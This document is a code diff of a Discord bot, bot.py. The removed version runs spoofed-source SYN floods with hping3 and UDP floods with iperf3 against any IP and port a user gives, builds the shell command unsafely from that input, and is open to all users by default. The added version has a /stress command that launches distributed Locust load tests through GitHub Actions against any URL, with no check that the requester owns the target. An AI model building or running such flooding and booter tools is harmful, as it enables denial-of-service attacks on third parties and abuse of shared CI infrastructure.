@@ -1,88 +1,88 @@
-# bot.py
 import os
-import asyncio
-from typing import Literal
-import subprocess
-
 import discord
 from discord import app_commands
 from discord.ext import commands
+from github import Github
+from dotenv import load_dotenv
 
-# ─── Configuration ──────────────────────────────────────────────────────────────
-BOT_TOKEN       = os.getenv("DISCORD_TOKEN")
-ALLOWED_ROLE_ID = int(os.getenv("FLOODER_ROLE_ID", "0"))  # 0 = open to all
+load_dotenv()
+DISCORD_TOKEN = os.environ["DISCORD_TOKEN"]
+GITHUB_TOKEN  = os.environ["PAT_TOKEN"]
+GITHUB_OWNER  = os.environ["GITHUB_OWNER"]
+GITHUB_REPO   = os.environ["GITHUB_REPO"]
+WORKFLOW_FILE = os.environ["WORKFLOW_FILE"]
+GITHUB_REF    = "main"  # or the branch/tag you want to run
 
-# Defaults for quick floods
-DEFAULT_TCP_DUR = 5      # seconds
-DEFAULT_UDP_BW  = "1G"
-DEFAULT_UDP_DUR = 5      # seconds
-# ────────────────────────────────────────────────────────────────────────────────
+# ---------------- Discord Bot Setup ----------------
 
-class FloodBot(commands.Bot):
-    def __init__(self):
-        super().__init__(command_prefix="!", intents=discord.Intents.none())
-        self.tree = app_commands.CommandTree(self)
+intents = discord.Intents.default()
+bot = commands.Bot(command_prefix="!", intents=intents)
 
-    async def setup_hook(self):
-        self.tree.add_command(flood)
-        await self.tree.sync()
+# Sync tree on_ready
+@bot.event
+async def on_ready():
+    await bot.tree.sync()
+    print(f"Logged in as {bot.user}")
 
-bot = FloodBot()
+# --------------- GitHub Dispatch Logic ---------------
 
-def has_flood_role(interaction: discord.Interaction) -> bool:
-    if ALLOWED_ROLE_ID == 0:
-        return True
-    return any(r.id == ALLOWED_ROLE_ID for r in interaction.user.roles)
+gh = Github(GITHUB_TOKEN)
+repo = gh.get_repo(f"{GITHUB_OWNER}/{GITHUB_REPO}")
 
-async def run_subprocess(cmd: str, timeout: float) -> tuple[int, str]:
-    proc = await asyncio.create_subprocess_shell(
-        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
-    )
-    await asyncio.sleep(timeout)
-    proc.terminate()
-    try:
-        await proc.wait()
-    except:
-        proc.kill()
-    _, err = await proc.communicate()
-    return proc.returncode, err.decode().strip()
-
-@bot.tree.command(name="flood", description="Quick TCP/UDP flood via hping3 or iperf3")
-@app_commands.describe(
-    tool="Which tool to use: hping3 or iperf3",
-    ip="Target IPv4",
-    port="Target port",
-    bw="(iperf3) bandwidth, e.g. 100M,1G",
-    dur="Duration in seconds",
-)
-async def flood(
-    interaction: discord.Interaction,
-    tool: Literal["hping3", "iperf3"],
-    ip: str,
-    port: int,
-    bw: str | None = None,
-    dur: int | None = None,
+async def dispatch_locust_workflow(
+    url: str,
+    users: int,
+    spawn_rate: int,
+    workers: int,
+    run_time: str
 ):
-    if not has_flood_role(interaction):
-        return await interaction.response.send_message("🚫 No permission.", ephemeral=True)
+    """Trigger the GitHub workflow_dispatch event with custom inputs."""
+    inputs = {
+        "HOST": url,
+        "USERS": str(users),
+        "SPAWN_RATE": str(spawn_rate),
+        "WORKERS": str(workers),
+        "RUN_TIME": run_time
+    }
+    repo.create_workflow_dispatch(
+        workflow_id=WORKFLOW_FILE,
+        ref=GITHUB_REF,
+        inputs=inputs
+    )
 
+# ---------------- Slash Command ----------------
+
+@bot.tree.command(name="stress", description="Kick off a distributed Locust stress test")
+@app_commands.describe(
+    url="The target URL to stress-test",
+    users="Total number of virtual users",
+    spawn_rate="Spawn rate (users per second)",
+    workers="How many worker processes to spin up",
+    run_time="Duration (e.g. 5m, 1h)"
+)
+async def stress(
+    interaction: discord.Interaction,
+    url: str,
+    users: int,
+    spawn_rate: int,
+    workers: int,
+    run_time: str
+):
     await interaction.response.defer(thinking=True)
+    try:
+        await dispatch_locust_workflow(url, users, spawn_rate, workers, run_time)
+        await interaction.followup.send(
+            f"🚀 Stress test requested!\n"
+            f"• Target: `{url}`\n"
+            f"• Users: `{users}` @ `{spawn_rate}` users/s\n"
+            f"• Workers: `{workers}`  Duration: `{run_time}`\n"
+            f"Check your GitHub Actions page for progress."
+        )
+    except Exception as e:
+        await interaction.followup.send(
+            f"❌ Failed to dispatch workflow: `{e}`", ephemeral=True
+        )
 
-    if tool == "hping3":
-        d = dur or DEFAULT_TCP_DUR
-        cmd = f"hping3 --flood --rand-source -S -p {port} {ip}"
-        desc = f"SYN flood at `{ip}:{port}` for ~{d}s"
-    else:
-        b  = bw  or DEFAULT_UDP_BW
-        d  = dur or DEFAULT_UDP_DUR
-        cmd = f"iperf3 -c {ip} -u -b {b} -t {d} -p {port} -y C"
-        desc = f"UDP flood at `{ip}:{port}` @ {b} for {d}s"
+# ------------- Run Bot -------------
 
-    code, stderr = await run_subprocess(cmd, timeout=(dur or DEFAULT_TCP_DUR) + 1)
-    if code == 0:
-        await interaction.followup.send(f"✅ `{tool}` completed: {desc}")
-    else:
-        await interaction.followup.send(f"⚠️ `{tool}` exited {code}\n```{stderr}```")
-
-if __name__ == "__main__":
-    bot.run(BOT_TOKEN)
+bot.run(DISCORD_TOKEN)
